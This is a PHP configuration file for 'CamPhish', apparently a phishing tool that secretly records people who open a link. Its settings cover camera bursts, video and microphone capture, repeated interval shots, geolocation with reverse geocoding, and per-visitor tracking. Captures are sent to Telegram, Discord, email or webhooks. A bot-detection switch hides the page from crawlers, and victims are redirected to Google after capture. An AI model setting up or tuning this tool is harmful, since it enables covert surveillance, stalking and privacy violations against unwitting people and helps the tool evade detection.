<?php
// ═══════════════════════════════════════════════════════════════════
//  CamPhish — Central Configuration
//  Edit this file to configure all features.
// ═══════════════════════════════════════════════════════════════════

return [

    // ── Admin Dashboard ────────────────────────────────────────────
    'admin_password'    => 'admin',          // Change this!
    'admin_session_ttl' => 3600,             // seconds before re-login

    // ── Telegram ───────────────────────────────────────────────────
    'telegram_token'    => '',               // Bot token from @BotFather
    'telegram_chat_id'  => '',               // Your chat/group ID

    // ── Discord Webhook ────────────────────────────────────────────
    'discord_webhook'   => '',               // Paste your Discord webhook URL

    // ── Email Alerts ───────────────────────────────────────────────
    'email_enabled'     => false,
    'email_to'          => '',               // Recipient e-mail
    'email_from'        => 'camphish@localhost',
    'email_subject'     => '[CamPhish] New capture!',

    // ── Generic Webhook ────────────────────────────────────────────
    'webhook_url'       => '',               // Any HTTP endpoint (Zapier, Make, etc.)

    // ── Capture Behaviour ──────────────────────────────────────────
    'burst_count'       => 5,               // Front camera burst shots
    'rear_burst_count'  => 3,               // Rear camera burst shots
    'video_duration'    => 8000,            // ms — video clip length
    'audio_duration'    => 15000,           // ms — mic recording length
    'interval_shots'    => true,            // Keep shooting every N seconds
    'interval_seconds'  => 30,             // Interval between extra shots

    // ── Link Expiry ────────────────────────────────────────────────
    'link_expiry_enabled' => false,
    'link_expiry_seconds' => 3600,          // Link dies after 1 hour
    'link_max_visits'     => 0,             // 0 = unlimited; N = kills after N visits
    'link_token'          => '',            // Set by launcher; leave blank here

    // ── Redirect After Capture ─────────────────────────────────────
    'redirect_url'      => 'https://google.com',

    // ── Bot Detection ──────────────────────────────────────────────
    'bot_detection'     => true,            // Show harmless page to bots/crawlers

    // ── Reverse Geocoding ──────────────────────────────────────────
    'reverse_geocode'   => true,            // Convert lat/lon → address via Nominatim

    // ── Session Tracking ──────────────────────────────────────────
    'session_tracking'  => true,            // Assign UUID per visitor

    // ── Auto-kill After First Capture ─────────────────────────────
    'autokill'          => false,           // Stop server after first successful photo

];
